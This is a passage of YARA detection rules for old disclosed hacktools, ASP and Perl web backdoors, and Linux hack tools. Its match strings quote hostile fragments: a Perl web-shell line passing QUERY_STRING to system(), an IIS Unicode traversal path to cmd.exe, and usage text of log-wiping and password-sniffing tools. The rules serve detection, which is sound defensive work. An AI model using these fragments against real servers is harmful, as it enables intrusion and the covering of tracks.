ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Install.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"95866e917f699ee74d4735300568640ea1a05afd\"\n\tstrings:\n\t\t$s1 = \"http://go.163.com/sdemo\" fullword wide\n\t\t$s2 = \"Player.tmp\" fullword ascii\n\t\t$s3 = \"Player.EXE\" fullword wide\n\t\t$s4 = \"mailto:sdemo@263.net\" fullword ascii\n\t\t$s5 = \"S-Player.exe\" fullword ascii\n\t\t$s9 = \"http://www.BaiXue.net (\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_TFTPD32 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TFTPD32.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8\"\n\tstrings:\n\t\t$s0 = \" http://arm.533.net\" fullword ascii\n\t\t$s1 = \"Tftpd32.hlp\" fullword ascii\n\t\t$s2 = \"Timeouts and Ports should be numerical and can not be 0\" fullword ascii\n\t\t$s3 = \"TFTPD32 -- \" fullword wide\n\t\t$s4 = \"%d -- %s\" fullword ascii\n\t\t$s5 = \"TIMEOUT while waiting for Ack block %d. file <%s>\" fullword ascii\n\t\t$s12 = \"TftpPort\" fullword ascii\n\t\t$s13 = \"Ttftpd32BackGround\" fullword ascii\n\t\t$s17 = \"SOFTWARE\\\\TFTPD32\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_iecv {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file iecv.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"6e6e75350a33f799039e7a024722cde463328b6d\"\n\tstrings:\n\t\t$s1 = \"Edit The Content Of Cookie \" fullword wide\n\t\t$s3 = \"Accessories\\\\wordpad.exe\" fullword ascii\n\t\t$s4 = \"gorillanation.com\" fullword ascii\n\t\t$s5 = \"Before editing the content of a cookie, you should close all windows of Internet\" ascii\n\t\t$s12 = \"http://nirsoft.cjb.net\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Antiy_Ports_1_21 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0\"\n\tstrings:\n\t\t$s0 = \"AntiyPorts.EXE\" fullword wide\n\t\t$s7 = \"AntiyPorts MFC Application\" fullword wide\n\t\t$s20 = \" @Stego:\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule perlcmd_zip_Folder_cmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file cmd.cgi\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21b5dc36e72be5aca5969e221abfbbdd54053dd8\"\n\tstrings:\n\t\t$s0 = \"syswrite(STDOUT, \\\"Content-type: text/html\\\\r\\\\n\\\\r\\\\n\\\", 27);\" fullword ascii\n\t\t$s1 = \"s/%20/ /ig;\" fullword ascii\n\t\t$s2 = \"syswrite(STDOUT, \\\"\\\\r\\\\n</PRE></HTML>\\\\r\\\\n\\\", 17);\" fullword ascii\n\t\t$s4 = \"open(STDERR, \\\">&STDOUT\\\") || die \\\"Can't redirect STDERR\\\";\" fullword ascii\n\t\t$s5 = \"$_ = $ENV{QUERY_STRING};\" fullword ascii\n\t\t$s6 = \"$execthis = $_;\" fullword ascii\n\t\t$s7 = \"system($execthis);\" fullword ascii\n\t\t$s12 = \"s/%2f/\\\\//ig;\" fullword ascii\n\tcondition:\n\t\t6 of them\n}\n\nrule aspbackdoor_asp3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp3.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e5588665ca6d52259f7d9d0f13de6640c4e6439c\"\n\tstrings:\n\t\t$s0 = \"<form action=\\\"changepwd.asp\\\" method=\\\"post\\\"> \" fullword ascii\n\t\t$s1 = \"  Set oUser = GetObject(\\\"WinNT://ComputerName/\\\" & UserName) \" fullword ascii\n\t\t$s2 = \"    value=\\\"<%=Request.ServerVariables(\\\"LOGIN_USER\\\")%>\\\"> \" fullword ascii\n\t\t$s14 = \" Windows NT \" fullword ascii\n\t\t$s16 = \" WIndows 2000 \" fullword ascii\n\t\t$s18 = \"OldPwd = Request.Form(\\\"OldPwd\\\") \" fullword ascii\n\t\t$s19 = \"NewPwd2 = Request.Form(\\\"NewPwd2\\\") \" fullword ascii\n\t\t$s20 = \"NewPwd1 = Request.Form(\\\"NewPwd1\\\") \" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_FPipe {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file FPipe.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"41d57d356098ff55fe0e1f0bcaa9317df5a2a45c\"\n\tstrings:\n\t\t$s0 = \"made to port 80 of the remote machine at 192.168.1.101 with the\" fullword ascii\n\t\t$s1 = \"Unable to resolve hostname \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \"source port for that outbound connection being set to 53 also.\" fullword ascii\n\t\t$s3 = \" -s    - outbound source port number\" fullword ascii\n\t\t$s5 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s20 = \"Attempting to connect to %s port %d\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_concon {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file concon.com\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"816b69eae66ba2dfe08a37fff077e79d02b95cc1\"\n\tstrings:\n\t\t$s0 = \"Usage: concon \\\\\\\\ip\\\\sharename\\\\con\\\\con\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_regdll {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file regdll.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5e16a00bcb1437bfe519b707e0f5c5f63a488d\"\n\tstrings:\n\t\t$s1 = \"exitcode = oShell.Run(\\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, \" ascii\n\t\t$s3 = \"oShell.Run \\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, False\" fullword ascii\n\t\t$s4 = \"EchoB(\\\"regsvr32.exe exitcode = \\\" & exitcode)\" fullword ascii\n\t\t$s5 = \"Public Property Get oFS()\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule CleanIISLog {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file CleanIISLog.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"827cd898bfe8aa7e9aaefbe949d26298f9e24094\"\n\tstrings:\n\t\t$s1 = \"CleanIP - Specify IP Address Which You Want Clear.\" fullword ascii\n\t\t$s2 = \"LogFile - Specify Log File Which You Want Process.\" fullword ascii\n\t\t$s8 = \"CleanIISLog Ver\" fullword ascii\n\t\t$s9 = \"msftpsvc\" fullword ascii\n\t\t$s10 = \"Fatal Error: MFC initialization failed\" fullword ascii\n\t\t$s11 = \"Specified \\\"ALL\\\" Will Process All Log Files.\" fullword ascii\n\t\t$s12 = \"Specified \\\".\\\" Will Clean All IP Record.\" fullword ascii\n\t\t$s16 = \"Service %s Stopped.\" fullword ascii\n\t\t$s20 = \"Process Log File %s...\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule sqlcheck {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcheck.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5a5778ac200078b627db84fdc35bf5bcee232dc7\"\n\tstrings:\n\t\t$s0 = \"Power by eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s3 = \"\\\\ipc$ \\\"\\\" /user:\\\"\\\"\" fullword ascii\n\t\t$s4 = \"SQLCheck can only scan a class B network. Try again.\" fullword ascii\n\t\t$s14 = \"Example: SQLCheck 192.168.0.1 192.168.0.254\" fullword ascii\n\t\t$s20 = \"Usage: SQLCheck <StartIP> <EndIP>\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule sig_238_RunAsEx {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file RunAsEx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35\"\n\tstrings:\n\t\t$s0 = \"RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com\" fullword ascii\n\t\t$s8 = \"cmd.bat\" fullword ascii\n\t\t$s9 = \"Note: This Program Can'nt Run With Local Machine.\" fullword ascii\n\t\t$s11 = \"%s Execute Succussifully.\" fullword ascii\n\t\t$s12 = \"winsta0\" fullword ascii\n\t\t$s15 = \"Usage: RunAsEx <UserName> <Password> <Execute File> [\\\"Execute Option\\\"]\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule sig_238_nbtdump {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file nbtdump.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8\"\n\tstrings:\n\t\t$s0 = \"Creation of results file - \\\"%s\\\" failed.\" fullword ascii\n\t\t$s1 = \"c:\\\\>nbtdump remote-machine\" fullword ascii\n\t\t$s7 = \"Cerberus NBTDUMP\" fullword ascii\n\t\t$s11 = \"<CENTER><H1>Cerberus Internet Scanner</H1>\" fullword ascii\n\t\t$s18 = \"<P><H3>Account Information</H3><PRE>\" fullword wide\n\t\t$s19 = \"%s's password is %s</H3>\" fullword wide\n\t\t$s20 = \"%s's password is blank</H3>\" fullword wide\n\tcondition:\n\t\t5 of them\n}\n\nrule sig_238_Glass2k {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Glass2k.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"b05455a1ecc6bc7fc8ddef312a670f2013704f1a\"\n\tstrings:\n\t\t$s0 = \"Portions Copyright (c) 1997-1999 Lee Hasiuk\" fullword ascii\n\t\t$s1 = \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\VB98\" fullword ascii\n\t\t$s3 = \"WINNT\\\\System32\\\\stdole2.tlb\" fullword ascii\n\t\t$s4 = \"Glass2k.exe\" fullword wide\n\t\t$s7 = \"NeoLite Executable File Compressor\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule SplitJoin_V1_3_3_rar_Folder_3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file splitjoin.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21409117b536664a913dcd159d6f4d8758f43435\"\n\tstrings:\n\t\t$s2 = \"ie686@sohu.com\" fullword ascii\n\t\t$s3 = \"splitjoin.exe\" fullword ascii\n\t\t$s7 = \"SplitJoin\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_EDIT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EDIT.ASP\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"12196cf62931cde7b6cb979c07bb5cc6a7535cbb\"\n\tstrings:\n\t\t$s1 = \"<meta HTTP-EQUIV=\\\"Content-Type\\\" CONTENT=\\\"text/html;charset=gb_2312-80\\\">\" fullword ascii\n\t\t$s2 = \"Set thisfile = fs.GetFile(whichfile)\" fullword ascii\n\t\t$s3 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n\t\t$s5 = \"if Request.Cookies(\\\"password\\\")=\\\"juchen\\\" then \" fullword ascii\n\t\t$s6 = \"Set thisfile = fs.OpenTextFile(whichfile, 1, False)\" fullword ascii\n\t\t$s7 = \"color: rgb(255,0,0); text-decoration: underline }\" fullword ascii\n\t\t$s13 = \"if Request(\\\"creat\\\")<>\\\"yes\\\" then\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule aspbackdoor_entice {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file entice.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183\"\n\tstrings:\n\t\t$s0 = \"<Form Name=\\\"FormPst\\\" Method=\\\"Post\\\" Action=\\\"entice.asp\\\">\" fullword ascii\n\t\t$s2 = \"if left(trim(request(\\\"sqllanguage\\\")),6)=\\\"select\\\" then\" fullword ascii\n\t\t$s4 = \"conndb.Execute(sqllanguage)\" fullword ascii\n\t\t$s5 = \"<!--#include file=sqlconn.asp-->\" fullword ascii\n\t\t$s6 = \"rstsql=\\\"select * from \\\"&rstable(\\\"table_name\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule FPipe2_0 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file FPipe2.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"891609db7a6787575641154e7aab7757e74d837b\"\n\tstrings:\n\t\t$s0 = \"made to port 80 of the remote machine at 192.168.1.101 with the\" fullword ascii\n\t\t$s1 = \"Unable to resolve hostname \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \" -s    - outbound connection source port number\" fullword ascii\n\t\t$s3 = \"source port for that outbound connection being set to 53 also.\" fullword ascii\n\t\t$s4 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s19 = \"FPipe\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule InstGina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InstGina.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5317fbc39508708534246ef4241e78da41a4f31c\"\n\tstrings:\n\t\t$s0 = \"To Open Registry\" fullword ascii\n\t\t$s4 = \"I love Candy very much!!\" ascii\n\t\t$s5 = \"GinaDLL\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule ArtTray_zip_Folder_ArtTray {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ArtTray.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"ee1edc8c4458c71573b5f555d32043cbc600a120\"\n\tstrings:\n\t\t$s0 = \"http://www.brigsoft.com\" fullword wide\n\t\t$s2 = \"ArtTrayHookDll.dll\" fullword ascii\n\t\t$s3 = \"ArtTray Version 1.0 \" fullword wide\n\t\t$s16 = \"TRM_HOOKCALLBACK\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_findoor {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file findoor.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce\"\n\tstrings:\n\t\t$s0 = \"(non-Win32 .EXE or error in .EXE image).\" fullword ascii\n\t\t$s8 = \"PASS hacker@hacker.com\" fullword ascii\n\t\t$s9 = \"/scripts/..%c1%1c../winnt/system32/cmd.exe\" fullword ascii\n\t\t$s10 = \"MAIL FROM:hacker@hacker.com\" fullword ascii\n\t\t$s11 = \"http://isno.yeah.net\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule aspbackdoor_ipclear {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ipclear.vbs\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"9f8fdfde4b729516330eaeb9141fb2a7ff7d0098\"\n\tstrings:\n\t\t$s0 = \"Set ServiceObj = GetObject(\\\"WinNT://\\\" & objNet.ComputerName & \\\"/w3svc\\\")\" fullword ascii\n\t\t$s1 = \"wscript.Echo \\\"USAGE:KillLog.vbs LogFileName YourIP.\\\"\" fullword ascii\n\t\t$s2 = \"Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)\" fullword ascii\n\t\t$s3 = \"Set objNet = WScript.CreateObject( \\\"WScript.Network\\\" )\" fullword ascii\n\t\t$s4 = \"Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule WinEggDropShellFinal_zip_Folder_InjectT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InjectT.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"516e80e4a25660954de8c12313e2d7642bdb79dd\"\n\tstrings:\n\t\t$s0 = \"Packed by exe32pack\" ascii\n\t\t$s1 = \"2TInject.Dll\" fullword ascii\n\t\t$s2 = \"Windows Services\" fullword ascii\n\t\t$s3 = \"Findrst6\" fullword ascii\n\t\t$s4 = \"Press Any Key To Continue......\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_rshsvc {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file rshsvc.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"fb15c31254a21412aecff6a6c4c19304eb5e7d75\"\n\tstrings:\n\t\t$s0 = \"if not exist %1\\\\rshsetup.exe goto ERROR2\" fullword ascii\n\t\t$s1 = \"ECHO rshsetup.exe is not found in the %1 directory\" fullword ascii\n\t\t$s9 = \"REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll\" fullword ascii\n\t\t$s10 = \"copy %1\\\\rshsvc.exe\" fullword ascii\n\t\t$s12 = \"ECHO Use \\\"net start rshsvc\\\" to start the service.\" fullword ascii\n\t\t$s13 = \"rshsetup %SystemRoot%\\\\system32\\\\rshsvc.exe %SystemRoot%\\\\system32\\\\rshsvc.dll\" fullword ascii\n\t\t$s18 = \"pushd %SystemRoot%\\\\system32\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule gina_zip_Folder_gina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file gina.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e0429e1b59989cbab6646ba905ac312710f5ed30\"\n\tstrings:\n\t\t$s0 = \"NEWGINA.dll\" fullword ascii\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s3 = \"WlxActivateUserShell\" fullword ascii\n\t\t$s6 = \"WlxWkstaLockedSAS\" fullword ascii\n\t\t$s13 = \"WlxIsLockOk\" fullword ascii\n\t\t$s14 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s16 = \"WlxShutdown\" fullword ascii\n\t\t$s17 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule superscan3_0 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file superscan3.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d\"\n\tstrings:\n\t\t$s0 = \"\\\\scanner.ini\" fullword ascii\n\t\t$s1 = \"\\\\scanner.exe\" fullword ascii\n\t\t$s2 = \"\\\\scanner.lst\" fullword ascii\n\t\t$s4 = \"\\\\hensss.lst\" fullword ascii\n\t\t$s5 = \"STUB32.EXE\" fullword wide\n\t\t$s6 = \"STUB.EXE\" fullword wide\n\t\t$s8 = \"\\\\ws2check.exe\" fullword ascii\n\t\t$s9 = \"\\\\trojans.lst\" fullword ascii\n\t\t$s10 = \"1996 InstallShield Software Corporation\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_xsniff {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file xsniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d61d7329ac74f66245a92c4505a327c85875c577\"\n\tstrings:\n\t\t$s2 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n\t\t$s3 = \"%s - simple sniffer for win2000\" fullword ascii\n\t\t$s4 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n\t\t$s5 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n\t\t$s7 = \"http://www.xfocus.org\" fullword ascii\n\t\t$s9 = \"  -pass        : Filter username/password\" fullword ascii\n\t\t$s18 = \"  -udp         : Output udp packets\" fullword ascii\n\t\t$s19 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s20 = \"  -tcp         : Output tcp packets\" fullword ascii\n\tcondition:\n\t\t6 of them\n}\n\nrule sig_238_fscan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file fscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d5646e86b5257f9c83ea23eca3d86de336224e55\"\n\tstrings:\n\t\t$s0 = \"FScan v1.12 - Command line port scanner.\" fullword ascii\n\t\t$s2 = \" -n    - no port scanning - only pinging (unless you use -q)\" fullword ascii\n\t\t$s5 = \"Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200\" fullword ascii\n\t\t$s6 = \" -z    - maximum simultaneous threads to use for scanning\" fullword ascii\n\t\t$s12 = \"Failed to open the IP list file \\\"%s\\\"\" fullword ascii\n\t\t$s13 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s16 = \" -p    - TCP port(s) to scan (a comma separated list of ports/ranges) \" fullword ascii\n\t\t$s18 = \"Bind port number out of range. Using system default.\" fullword ascii\n\t\t$s19 = \"fscan.exe\" fullword wide\n\tcondition:\n\t\t4 of them\n}\n\nrule _iissample_nesscan_twwwscan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\tsuper_rule = 1\n\t\thash0 = \"7f20962bbc6890bf48ee81de85d7d76a8464b862\"\n\t\thash1 = \"c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b\"\n\t\thash2 = \"548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f\"\n\tstrings:\n\t\t$s0 = \"Connecting HTTP Port - Result: \" fullword\n\t\t$s1 = \"No space for command line argument vector\" fullword\n\t\t$s3 = \"Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp\" fullword\n\t\t$s5 = \"No space for copy of command line\" fullword\n\t\t$s7 = \"-  Windows NT,2000 Patch Method  - \" fullword\n\t\t$s8 = \"scanf : floating point formats not linked\" fullword\n\t\t$s12 = \"hrdir_b.c: LoadLibrary != mmdll borlndmm failed\" fullword\n\t\t$s13 = \"!\\\"what?\\\"\" fullword\n\t\t$s14 = \"%s Port %d Closed\" fullword\n\t\t$s16 = \"printf : floating point formats not linked\" fullword\n\t\t$s17 = \"xxtype.cpp\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule _FsHttp_FsPop_FsSniffer {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\tsuper_rule = 1\n\t\thash0 = \"9d4e7611a328eb430a8bb6dc7832440713926f5f\"\n\t\thash1 = \"ae23522a3529d3313dd883727c341331a1fb1ab9\"\n\t\thash2 = \"7ffc496cd4a1017485dfb571329523a52c9032d8\"\n\tstrings:\n\t\t$s0 = \"-ERR Invalid Command, Type [Help] For Command List\" fullword\n\t\t$s1 = \"-ERR Get SMS Users ID Failed\" fullword\n\t\t$s2 = \"Control Time Out 90 Secs, Connection Closed\" fullword\n\t\t$s3 = \"-ERR Post SMS Failed\" fullword\n\t\t$s4 = \"Current.hlt\" fullword\n\t\t$s6 = \"Histroy.hlt\" fullword\n\t\t$s7 = \"-ERR Send SMS Failed\" fullword\n\t\t$s12 = \"-ERR Change Password <New Password>\" fullword\n\t\t$s17 = \"+OK Send SMS Succussifully\" fullword\n\t\t$s18 = \"+OK Set New Password: [%s]\" fullword\n\t\t$s19 = \"CHANGE PASSWORD\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule Ammyy_Admin_AA_v3 {\n\tmeta:\n\t\tdescription = \"Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/gkAg2E\"\n\t\tdate = \"2014/12/22\"\n\t\tscore = 55\n\t\thash1 = \"b130611c92788337c4f6bb9e9454ff06eb409166\"\n\t\thash2 = \"07539abb2623fe24b9a05e240f675fa2d15268cb\"\n\tstrings:\n\t\t$x1 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrService.cpp\" fullword ascii\n\t\t$x2 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrDesktopCopyRect.cpp\" fullword ascii\n\t\t$x3 = \"Global\\\\Ammyy.Target.IncomePort\" fullword ascii\n\t\t$x4 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrFmFileSys.cpp\" fullword ascii\n\t\t$x5 = \"Please enter password for accessing remote computer\" fullword ascii\n\n\t\t$s1 = \"CreateProcess1()#3 %d error=%d\" fullword ascii\n\t\t$s2 = \"CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name.\" fullword ascii\n\t\t$s3 = \"ERROR: CreateProcessAsUser() error=%d, session=%d\" fullword ascii\n\t\t$s4 = \"ERROR: FindProcessByName('explorer.exe')\" fullword ascii\n\tcondition:\n\t\t2 of ($x*) or all of ($s*)\n}\n\n/* Other dumper and custom hack tools */\n\nrule LinuxHacktool_eyes_screen {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file screen\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"a240a0118739e72ff89cefa2540bf0d7da8f8a6c\"\n\tstrings:\n\t\t$s0 = \"or: %s -r [host.tty]\" fullword ascii\n\t\t$s1 = \"%s: process: character, ^x, or (octal) \\\\032 expected.\" fullword ascii\n\t\t$s2 = \"Type \\\"screen [-d] -r [pid.]tty.host\\\" to resume one of them.\" fullword ascii\n\t\t$s6 = \"%s: at [identifier][%%|*|#] command [args]\" fullword ascii\n\t\t$s8 = \"Slurped only %d characters (of %d) into buffer - try again\" fullword ascii\n\t\t$s11 = \"command from %s: %s %s\" fullword ascii\n\t\t$s16 = \"[ Passwords don't match - your armor crumbles away ]\" fullword ascii\n\t\t$s19 = \"[ Passwords don't match - checking turned off ]\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule LinuxHacktool_eyes_scanssh {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file scanssh\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"467398a6994e2c1a66a3d39859cde41f090623ad\"\n\tstrings:\n\t\t$s0 = \"Connection closed by remote host\" fullword ascii\n\t\t$s1 = \"Writing packet : error on socket (or connection closed): %s\" fullword ascii\n\t\t$s2 = \"Remote connection closed by signal SIG%s %s\" fullword ascii\n\t\t$s4 = \"Reading private key %s failed (bad passphrase ?)\" fullword ascii\n\t\t$s5 = \"Server closed connection\" fullword ascii\n\t\t$s6 = \"%s: line %d: list delimiter not followed by keyword\" fullword ascii\n\t\t$s8 = \"checking for version `%s' in file %s required by file %s\" fullword ascii\n\t\t$s9 = \"Remote host closed connection\" fullword ascii\n\t\t$s10 = \"%s: line %d: bad command `%s'\" fullword ascii\n\t\t$s13 = \"verifying that server is a known host : file %s not found\" fullword ascii\n\t\t$s14 = \"%s: line %d: expected service, found `%s'\" fullword ascii\n\t\t$s15 = \"%s: line %d: list delimiter not followed by domain\" fullword ascii\n\t\t$s17 = \"Public key from server (%s) doesn't match user preference (%s)\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule LinuxHacktool_eyes_pscan2 {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file pscan2\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = 